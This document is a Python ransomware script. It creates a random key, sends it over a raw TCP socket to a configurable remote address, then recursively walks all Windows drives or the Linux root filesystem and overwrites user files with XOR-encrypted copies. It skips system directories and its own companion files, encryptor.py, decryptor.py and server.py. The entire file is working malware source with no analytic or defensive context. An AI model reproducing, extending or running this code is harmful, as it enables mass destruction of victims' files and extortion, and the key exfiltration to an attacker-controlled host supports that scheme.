#!/usr/bin/env python3

import time
import os
import socket



def encrypt(key,file):

    try:
        with open(file,"rb") as target_file:
            
            print(f"[+] encrypting {file}")
            result=bytearray()
            data=target_file.read()
            for i in range(len(data)):
                result.append(data[i] ^ key[i % len(key)])
        
        with open(file,"wb") as target_file:
            target_file.write(bytes(result))
            print(f"[+] {file} encrypted successfully")
            
    except Exception as e:
        print(f"[x] failed to encrypt {file}... error: {e}")
 


def gen_key():
    #generate 512-bit key (64 bytes)
    print("[+] loading source of entropy\n\n\n")
    key=os.urandom(64)
    '''
    with open("key.key","wb") as enc_key:
        enc_key.write(key)
    '''
    return key

def send_key(key):
    IP_ADDR="192.168.1.11" #ADD IP HERE
    PORT=1023      #ADD PORT HERE
    hex_key=key.hex()
    #print(hex_key)
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        while True:
            try:
                print(f"[+] connecting to {IP_ADDR}:{PORT}...")
                s.connect((IP_ADDR,PORT))
                print(f"[+] connection succeeded...")
                print(f"[+] sending key...")
                s.send(hex_key.encode())
                print(f"[+] key sent..")
                break
            except Exception as e:
                print(f"[x] connection failed, error : {e}")
                time.sleep(3)
                print(f"[+] retrying to connect")
            finally:
                s.close()




def check_os():
    if os.name == "nt":
        return 0
    elif os.name == "posix":
        return 1
    else:
        return 2

if __name__ == "__main__":
        
    if check_os() == 0:
        #windows
        os.system("cls")
        key=gen_key()
        send_key(key)
        file_paths=[]
        possible_root_path = [
            "A:/", "B:/", "C:/", "D:/", "E:/", "F:/", "G:/", "H:/", 
            "I:/", "J:/", "K:/", "L:/", "M:/", "N:/", "O:/", "P:/", 
            "Q:/", "R:/", "S:/", "T:/", "U:/", "V:/", "W:/", "X:/", 
            "Y:/", "Z:/"
        ] 
        actual_root_path=[]
        required_paths=[]
        excluded_paths=[
        "Windows", "Program Files", 
        "Program Files (x86)"
        ]
        files_processed=0
        folders_processed=0
        counter=0        
        for i in range(len(possible_root_path)):
            if os.path.exists(possible_root_path[i]):
                actual_root_path.append(possible_root_path[i])

        '''
        #debug
        for item in actual_root_path:
            print(item)
        '''
        for root_dir in actual_root_path:
            for item in os.listdir(root_dir):
                is_excluded=False
                for excluded_path in excluded_paths:
                    if excluded_path in item:
                        is_excluded=True
                        #print(f"[+] excluded {item}")
                        break
                if not is_excluded:
                    folders_processed+=1
                    print(f"\r[+] added {folders_processed} folders...",end='')
                    required_paths.append(os.path.join(root_dir,item))
        print("\n")
        for item in required_paths:
            print(f"REQUIRED PATH ===> {item}")
        
        
        for required_path in required_paths:
            for dirpath,dirnames,filenames in os.walk(required_path,topdown=True):
                for filename in filenames:
                    if filename == "encryptor.py" or filename == "decryptor.py" or filename == "server.py" or filename == "enc_key.key":
                        continue
                    file_paths.append(os.path.join(dirpath,filename))
                    files_processed+=1
                    print(f"\r[+] added {files_processed} files...",end='')
                    
        print("\n")
        for item in file_paths:
            #print(item) #debug
            encrypt(key,item)        
            
               

        
        '''
        #debug
        for path in required_paths:
            print(path)
        '''
        
        
    elif check_os() == 1:
        #linux
        os.system("clear")
        key=gen_key()
        send_key(key)
        file_paths=[]
        root_dir="/"
        required_paths=[]
        excluded_paths=[
        "bin","sbin","lib",
        "lib64","sys","opt",
        "var","etc","proc",
        "usr","run","mnt",
        "media","dev","tmp",
        "boot","snap","srv",
        "snap"
        ]
        files_processed=0
        folders_processed=0
        counter=0
        '''
        #debug
        for item in actual_root_path:
            print(item)
        '''
        
        for item in os.listdir(root_dir):
            is_excluded=False
            for excluded_path in excluded_paths:
                if excluded_path in item:
                    is_excluded=True
                    print(f"[+] excluded {item}")
                    break
            if not is_excluded:
                folders_processed+=1
                #print(f"\r[+] added {folders_processed} folders...",end='')
                required_paths.append(os.path.join(root_dir,item))
        print("\n")
        for item in required_paths:
            print(f"REQUIRED PATH ===> {item}")
        
        
        for required_path in required_paths:
            for dirpath,dirnames,filenames in os.walk(required_path,topdown=True):
                for filename in filenames:
                    if filename == "encryptor.py" or filename == "decryptor.py" or filename == "server.py" or filename == "enc_key.key" or filename == ".bashrc" or filename == ".sudo_as_admin_successful" or filename == ".profile" or filename == ".bash_logout" or filename == ".python_history":
                        continue
                    if ".cache" in dirpath or ".config" in dirpath or "snap" in dirpath or ".ssh" in dirpath or ".local" in dirpath or ".gnupg" in dirpath:
                        continue
                    file_paths.append(os.path.join(dirpath,filename))
                    files_processed+=1
                    print(f"\r[+] added {files_processed} files...",end='')
                  
        print("\n")
        
        for item in file_paths:
            #print(item) #debug
            encrypt(key,item)   
            
                   

    else:
        print("[x] the os is not supported..")
        exit(1)

